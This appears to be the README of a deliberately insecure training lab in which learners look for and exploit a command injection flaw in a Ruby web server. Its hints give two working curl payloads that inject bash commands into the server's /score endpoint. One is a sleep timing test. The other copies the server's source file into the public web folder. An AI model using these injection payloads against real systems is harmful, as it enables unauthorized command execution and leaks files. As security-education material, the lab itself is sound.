# 🔥 Vulnerable Labs: Where's Wally - Injection Style
*A deliberately insecure application for security education and demos*

---

## 💀 About the Challenge

This exercise will test your ability to spot and exploit **Command Injection vulnerabilities**, one of the most dangerous OWASP Top 10 risks.

### 🎯 Your Mission

1. Look at [webserver.rb](../web/webserver.rb)
2. Can you find the command injection vulnerability? 
3. Are you able to explain why it's vulnerable?
4. How could you validate that it was an exploitable?

### 💥 Hints & Tips

Try running the following commands, what is the result?

Note: Don't forget to substitute "website_ip" for the Public IP address of your WebServer EC2 instance. 

```bash
curl -X POST http://website_ip/score -d '""; bash -c "sleep 5" #'
```

```bash
curl -X POST http://website_ip/score -d '""; bash -c "cat webserver.rb > public/test.txt" #'
```
Note: All files in the public/ folder are accessible from the website_ip/ root. 